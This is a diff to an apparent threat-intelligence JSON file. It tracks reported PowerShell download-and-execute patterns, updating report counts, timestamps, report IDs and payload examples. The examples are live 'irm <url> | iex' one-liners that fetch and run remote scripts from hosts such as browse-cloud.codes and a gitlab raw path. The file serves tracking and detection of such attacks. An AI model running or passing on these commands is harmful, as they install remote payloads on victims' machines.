@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 151,
-    "ReportCount": 151,
+    "DistinctPayloadCount": 152,
+    "ReportCount": 152,
     "FirstSeen": "2026-11-10T09:55:19.073000+00:00",
-    "LastSeen": "2026-11-16T16:15:43.236000+00:00",
+    "LastSeen": "2026-11-16T18:11:05.678000+00:00",
     "ReportIds": [
       "cmwaikzu608q10omllivblirh",
       "cmwaila5l08ql0omlduekey7c",
@@ -156,7 +156,8 @@
       "cmwjgekmp17wn0omlkwsofjbb",
       "cmwjgg9dc17z70oml35rrf75e",
       "cmwjgjbds18760omlye859nvq",
-      "cmwjgtb3118ia0omlurpyuw41"
+      "cmwjgtb3118ia0omlurpyuw41",
+      "cmwjkxoi218tj0omlrq3g2ch1"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -210,6 +211,7 @@
       "irm 'browse-cloud.codes/b9f17bd99b1e9a1d'|iex;",
       "irm 'browse-cloud.codes/bb10ac06f389d7c9'|iex;",
       "irm 'browse-cloud.codes/c5621fb7f3b4133b'|iex;",
+      "irm 'browse-cloud.codes/c8ca95eaeac086b6'|iex;",
       "irm 'browse-cloud.codes/ced7a9afa43f4429'|iex;",
       "irm 'browse-cloud.codes/d672b0f95721a987'|iex;",
       "irm 'browse-cloud.codes/da9e95e67701632a'|iex;",
@@ -525,9 +527,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 16,
-    "ReportCount": 148,
+    "ReportCount": 149,
     "FirstSeen": "2026-11-09T21:46:06.578000+00:00",
-    "LastSeen": "2026-11-16T09:40:35.633000+00:00",
+    "LastSeen": "2026-11-16T18:11:22.915000+00:00",
     "ReportIds": [
       "cmw9sj86l05zm0omlpfcti0fc",
       "cmw9skaqb064e0omlfadn4wxj",
@@ -676,7 +678,8 @@
       "cmwipmr8w10qm0omla41u3zjf",
       "cmwipnx5h10rt0omlraf3fb6q",
       "cmwitstsl15m00omlpia4l632",
-      "cmwj2p67u16ef0oml8gvz64x2"
+      "cmwj2p67u16ef0oml8gvz64x2",
+      "cmwjky1uy18u30oml4osuzwws"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
